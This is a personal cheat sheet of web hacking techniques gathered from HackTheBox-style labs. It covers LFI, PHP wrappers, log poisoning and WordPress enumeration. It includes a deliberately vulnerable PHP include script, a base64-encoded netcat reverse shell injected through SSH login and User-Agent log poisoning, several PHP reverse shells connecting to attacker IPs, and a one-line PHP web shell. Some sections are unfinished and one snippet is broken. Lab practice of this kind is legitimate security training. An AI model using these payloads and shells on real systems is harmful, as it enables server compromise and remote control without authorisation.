# Web hacking labs

This is a compilation of the web hacking techniques I could recopilate trying separate it in each category or from what hackthebox machine I was able to get it!

Hope you enjoy!

Generic process:
```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -u http://10.10.10.88 -o gobuster/port80root.txt

feroxbuster -u http://10.10.10.88 -x php -B -n
```


The different attacks we're going to deploy here and define a methodology are:
- Local File Inclusion
- Wrappers
- Log Poisoning
- Remote File Inclusion
- HTML Injection
- Cross-Site Scripting (XSS)
- Blind Cross-Site Scripting (XSS Blind)?
- Cross-Site Request Forgery (CSRF)
- Server-Side Request Forgery (SSRF)
- SQLi - Error based
- SQLi - Time based
- Padding Oracle Attack (Padbuster)
- Padding Oracle Attack (Bit Flipper Attack with Burpsuite)
- ShellShock
- XML External Entity Injection (XXE)
- Blind XXE
- Domain Zone Transfer
- Insecure Deserialization
- Type Juggling


-----------------------

Other I plan to add:
- IDOR
- Magic Numbers
- IDN homographic attack



## Local File Inclusion
**PoC**
```bash
#run apache service
sudo service apache2 start
#check the port 80 busy
lsof -i:80

#Create a php app
cd /var/www/html
nano example.php
```
```text
<?php
	$filename = $_GET['file']; # ?file=example.php
	include($filename);# to include a particular path include("/var/www/html/" . $filename), but you can bypass with ../../../.....
?>
```


Right now you can exploit the LFI in your local machine with: `localhost/example.php?file=/etc/passwd`

What can we do exploit with this?:
- Enum users (/etc/passwd)
- Extract ssh keys (~/.ssh/id_rsa)
- Log Poisoning
- Enumerate /proc/ information
	- Enumerate process and IP interfaces (/proc/sched_debug)
	- Enumerate IP interfaces (/proc/net/fib_trie)
	- Enumerate open ports (/proc/net/tcp)
	```
	for port in $(curl -s "http://localhost/example.php?file=/proc/net/tcp" | awk '{print $2}' | grep -v local_address | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> Puerto $(echo "ibase=16; $port" | bc)"; done
	```
	And if you can't use bc other way to conver hexadecimal to decimal in bash is:
	```
	for port in $(cat /proc/net/tcp | awk '{print $2}' | grep -v local_address | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> Puerto $(printf $port=%d\n)" $((16#$port)); done
	```
#### Bypassing restriction for LFI
[Still not developed]
**Null Byte injection**
Code example:
```php
<?php
	$filename = $_GET['file'];
	include("/var/www/html" . $filename ".randomextension");
?>
```
You could avoid the extension reading adding a null byte injectio
../../../../etc/passwd%00

**PHP Wrappers**
You can try bypass some LFI restirctions using the Wrappers:&
- `http://localhost/example.php?file=file://../../../../etc/passwd`
- `http://localhost/example.php?file=php://filter/convert.base64-encode/resource=/../../../../etc/passwd`
- 


## Log Poisoning
To convert a LFI in RCE we can use the logs files:
```
#check the apache logs
http://localhost/example.php?file=/var/log/apache2/access.log
#ssh login tries
http://localhost/example.php?file=/var/log/auth.log
##to exploit this you can try to use a reverse shell command as a user but code it in base64
echo "nc -e /bin/bash ip_kali 443" | base64
>bmMgLWUgL2Jpbi9iYXNoIGlwX2thbGkgNDQzCg==
###login in the ssh service
ssh '<?php system("echo bmMgLWUgL2Jpbi9iYXNoIGlwX2thbGkgNDQzCg== | base64 -d | bash"); ?>'
```
We can modify the user-agent to execute php code when we access it using the LFI vulenrability
```
curl -s -H "User-Agent: <?php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/apache2/access.log"
```

## Remote File Inclusion - RFI
You can create a malicious php in your local machine and make the remote server download and execute this file.
To exploit this and get a reverse shell you need three tabs opened and execute in the next order:
```

```


--------------------------------------
## CMR
#### Wordpress
If you detect and wordpress site first thing you should do is locate plugins in that:
```
wpscan -u http://10.10.10.88/webservice/wp/ --enumerate p,t,u | tee wpscan.log

##with wfuzz
###locate *plugin* -> /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
wfuzz -c -hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
```



--------------------------------------
# Anex A
PHP functions to execute with php:
- system
- exec
- passthru
- shell_exec


https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/

## basic php reverse shells
```
<?php
        exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/4321 0>&1'");
?>

<?php
  system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'");
?>

<?php
        system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4321 >/tmp/f');
?> 

<?php
    echo "<pre>" . shell.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4321 >/tmp/f') . "</pre>";
?>
```

## Basic php web-shell
```
<?php
	system($_REQUEST['cmd']);
?>


```
